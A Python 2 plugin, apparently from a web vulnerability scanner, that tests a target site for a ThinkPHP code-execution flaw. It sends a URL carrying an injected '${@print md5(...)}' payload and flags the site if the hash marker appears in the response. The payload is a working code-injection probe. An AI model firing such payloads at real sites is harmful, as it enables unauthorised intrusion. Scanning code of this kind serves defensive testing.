#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s/" % (ob['scheme'],domain)
        expurl = "/index.php/Index/index/name/$%7B@print%20md5(NVS_SERVER_TEST_THINKPHP)%7D"
        exp="%s%s"%(url,expurl)
        r, c = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        res, content = requestUrl(http,exp,ob['task_id'],ob['domain_id'])
        if  content.find("d7ffe7b0c7265a42b27c62b5ef5a974a")>=0 and c.find("d7ffe7b0c7265a42b27c62b5ef5a974a")<0:
            
            
        
            request = getRequest(exp)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:thinkphplitecmsexescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:thinkphplitecmsexescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def